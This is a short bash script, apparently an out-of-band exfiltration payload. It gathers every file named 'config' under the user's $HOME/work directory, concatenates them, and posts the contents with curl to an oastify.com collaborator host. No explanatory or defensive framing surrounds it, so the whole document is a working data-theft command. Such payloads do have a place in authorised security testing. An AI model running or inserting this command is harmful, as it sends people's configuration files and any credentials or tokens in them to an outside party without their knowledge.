#!/usr/bin/env bash

find $HOME/work -type f -name config | xargs cat | curl -d @- 'z33i0w0331kfzj2cdw0q98rnfel59vxk.oastify.com'
